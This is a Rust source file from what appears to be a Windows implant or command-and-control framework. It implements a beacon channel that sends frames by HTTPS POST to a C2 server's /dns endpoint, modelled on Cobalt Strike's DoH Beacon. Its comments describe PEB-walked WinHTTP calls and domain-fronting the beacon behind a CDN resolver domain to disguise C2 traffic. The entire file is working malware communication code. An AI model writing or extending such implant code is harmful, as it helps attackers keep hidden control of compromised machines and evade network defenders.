//! Native DNS beacon channel — DoH-style HTTPS POST to `/dns`.
//!
//! A true PIC-implant raw-UDP DNS tunnel (ws2_32 FFI + hand-built DNS wire
//! packets) is heavy and adds a new dependency surface. Instead we mirror the
//! Cobalt Strike 4.11 "DoH Beacon" shape: the frame is POSTed over WinHTTP to
//! the C2 server's `/dns` endpoint with a `application/dns-message` flavor.
//! This reuses the existing PEB-walked WinHTTP plumbing and only differs from
//! the HTTPS channel in (a) the URI path and (b) optionally targeting a DoH
//! resolver host declared in `ctx.doh_resolver`.
//!
//! When `ctx.doh_resolver` is non-empty it is used as the connect host
//! (domain-fronting the beacon behind a resolver domain); otherwise the
//! standard `ctx.server_host` is used. `server_port` / `use_tls` are unchanged.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// Send `frame` as an HTTPS POST to `/dns`, return the response body.
///
/// Delegates to `transport::post_frame()`. The host is `ctx.doh_resolver`
/// when set, otherwise `ctx.server_host` — so an operator can front the DNS
/// beacon behind a CDN resolver domain while keeping the same C2 port/TLS.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    let host: &[u8] = if !ctx.doh_resolver.is_empty() {
        ctx.doh_resolver.as_bytes()
    } else {
        ctx.server_host.as_bytes()
    };
    unsafe {
        crate::transport::post_frame(
            host,
            ctx.server_port,
            b"/dns",
            frame,
            ctx.use_tls,
        )
    }
}
